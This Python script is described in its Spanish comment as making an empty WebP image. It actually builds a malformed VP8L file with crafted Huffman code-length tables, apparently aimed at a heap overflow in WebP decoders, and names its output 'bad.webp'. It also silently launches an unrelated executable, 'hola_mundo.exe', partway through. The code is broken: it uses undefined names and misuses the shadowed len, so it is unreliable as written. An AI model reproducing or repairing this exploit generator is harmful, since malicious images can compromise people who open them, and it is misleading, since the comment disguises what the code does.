# -*- coding: utf-8 -*-
"""
Spyder Editor

@autor= Fan_tasma
"""
#crea un archivo WebP (un formato de imagen) vacío con una estructura de encabezado específica
import struct
import subprocess 

def make_riff_header(riff_size, vp8l_size):
    riff_magic = b'RIFF'
    webp_magic = b'WEBP'
    vp8l_magic = b'VP8L'
    return riff_magic + struct.pack('<I', riff_size) + webp_magic + vp8l_magic + struct.pack('<I', vp8l_size)

def craft_webp(filename):
    def VP8LPutBits(bw, bits, n_bits):
        nonlocal cur_bits
        nonlocal cur_bit_count

        if cur_bit_count + n_bits > 32:
            flush_bits(bw)

        cur_bits |= (bits & ((1 << n_bits) - 1)) << cur_bit_count
        cur_bit_count += n_bits

    def flush_bits(bw):
        nonlocal cur_bits
        nonlocal cur_bit_count

        while cur_bit_count >= 8:
            bw.write(struct.pack('B', cur_bits & 0xFF))
            cur_bits >>= 8
            cur_bit_count -= 8

    def write_header(bw, width, height, has_alpha):
        bw.write(b'\x2f')
        VP8LPutBits(bw, width - 1, 14)
        VP8LPutBits(bw, height - 1, 14)
        VP8LPutBits(bw, 1 if has_alpha else 0, 1)
        VP8LPutBits(bw, 0, 3)

    bw = open(filename, 'wb')
    bw.write(make_riff_header(0, 0))  # Placeholder for RIFF size and VP8L size
    cur_bits = 0
    cur_bit_count = 0

    write_header(bw, 1, 1, False)
    VP8LPutBits(bw, 0, 1)
    VP8LPutBits(bw, 0, 1)
    VP8LPutBits(bw, 0, 1)

    code_lengths_counts = [
        [0, 1, 1, 0, 0, 0, 0, 0, 0, 3, 229, 41, 1, 1, 1, 2],
        [0, 1, 1, 0, 0, 0, 0, 0, 0, 7, 241, 1, 1, 1, 1, 2],
        [0, 1, 1, 0, 0, 0, 0, 0, 0, 7, 241, 1, 1, 1, 1, 2],
        [0, 1, 1, 0, 0, 0, 0, 0, 0, 7, 241, 1, 1, 1, 1, 2],
        [0, 1, 1, 1, 1, 1, 0, 0, 0, 11, 5, 1, 10, 4, 2, 2],
    ]

    kAlphabetSize = [280, 256, 256, 256, 40]

    for i in range(len(code_lengths_counts)):
        code_lengths = []
        write = 0
        total = 0
        for len in range(MAX_ALLOWED_CODE_LENGTH + 1):
            repeat_count = code_lengths_counts[i][len]
            code_lengths.extend([len] * repeat_count)
            total += repeat_count
        assert len(code_lengths) <= kAlphabetSize[i]

        VP8LPutBits(bw, 0, 1)
        VP8LPutBits(bw, len(kAlphabetSize[i]) - 4, 4)
        for j in range(kAlphabetSize[i]):
            VP8LPutBits(bw, code_lengths[j], 3)

        VP8LPutBits(bw, 0, 1)
        for j in range(len(code_lengths)):
            write_symbol(bw, code_lengths[j])

    VP8LPutBits(bw, 0, 1)
    bw.write(struct.pack('B', 0))

    bw.close()
    
    subprocess.run(["hola_mundo.exe"])

    with open(filename, 'rb+') as file_out:
        webpll_size = len(file_out.read()) - 12
        riff_size = 12 + webpll_size + (webpll_size % 2)
        file_out.seek(4)
        file_out.write(struct.pack('<I', riff_size))
        file_out.seek(16)
        file_out.write(struct.pack('<I', webpll_size))


if __name__ == "__main__":
    import sys

    if len(sys.argv) == 2:
        craft_webp(sys.argv[1])
    else:
        print("use: python crafteando.py bad.webp")
